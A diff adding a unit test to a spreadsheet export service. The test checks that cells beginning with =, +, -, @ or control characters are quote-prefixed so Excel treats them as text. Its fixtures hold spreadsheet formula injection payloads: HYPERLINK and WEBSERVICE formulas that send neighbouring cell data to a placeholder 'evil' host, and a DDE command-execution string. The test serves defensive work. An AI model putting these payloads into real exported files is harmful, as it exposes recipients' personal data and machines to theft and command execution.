@@ -264,6 +264,43 @@ describe('V11 B.S8 · ExportService — Project → xlsx (Phase 7 / D.38)', () =
     expect(buf.byteLength).toBeGreaterThan(10_000);
   }, 30_000);
 
+  it('9) Wave 5 EXP-C1 — Excel formula injection neutralised on every user-supplied string cell', async () => {
+    // Attacker-controlled values across every textual column. The
+    // redteam payload `=WEBSERVICE(...)` exfils adjacent PII the
+    // instant the manager opens the workbook on a network-connected
+    // machine. After Wave 5 PR A, every such cell gets prefixed
+    // with `'` so Excel displays it as text and never evaluates it.
+    const buf = await svc.renderProjectXlsx(
+      baseInput([
+        building('=HYPERLINK("https://evil/?x="&B2,"click")', [
+          apt('@cmd|"/c calc"!A1', [
+            owner('=WEBSERVICE("https://evil/?n="&L2)', 100, {
+              nationalId: '+123456789',
+              phone: '-501234567',
+            }),
+          ]),
+        ]),
+      ]),
+    );
+    const z = unzip(buf);
+    const ss = sharedStrings(z['xl/sharedStrings.xml']!);
+    const allStrings = ss.join('\n');
+    // Every dangerous leading char must now be preceded by `'`.
+    // Direct char checks (not regex over `allStrings`) — none of
+    // the strings in shared-strings begin with the bad chars.
+    for (const s of ss) {
+      if (s.length === 0) continue;
+      const head = s.charCodeAt(0);
+      // 0x3D `=` · 0x2B `+` · 0x2D `-` · 0x40 `@` · 0x09 TAB · 0x0D CR · 0x0A LF
+      expect([0x3d, 0x2b, 0x2d, 0x40, 0x09, 0x0d, 0x0a]).not.toContain(head);
+    }
+    // The payload IS still in the file (not silently stripped) — just
+    // text-prefixed. Verifies the recipient still SEES the value (so
+    // a normal Hebrew name like `=סימן השוויון` wouldn't be lost).
+    expect(allStrings).toContain('WEBSERVICE');
+    expect(allStrings).toContain('HYPERLINK');
+  });
+
   it('8) PII safety — workbook core props never contain national_id or phone strings', async () => {
     const buf = await svc.renderProjectXlsx(
       baseInput([
